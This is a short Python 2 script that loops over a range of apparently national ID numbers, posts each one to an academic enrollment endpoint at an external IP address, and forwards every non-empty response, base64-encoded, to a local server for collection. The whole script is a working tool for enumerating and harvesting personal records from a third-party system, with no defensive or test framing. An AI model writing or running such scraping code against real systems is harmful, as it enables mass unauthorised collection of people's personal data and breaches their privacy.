
#!/bin/python
import urllib, urllib2
import base64

url = "http://181.115.181.139/sisacademico/oferta/obt_postulaciones_ci"
url2 = "http://127.0.0.1/datosBett0/public/index.php/Egp"
for i in range(7156225, 7999999):
	post   =  urllib.urlencode({'ci': str(i)})
	pagina =  urllib.urlopen(url, post).read()
	if len(pagina) > 15:
		nuevo = url2 + "/" + base64.b64encode(pagina)
		servidor  = urllib.urlopen( nuevo ).read()
		print servidor
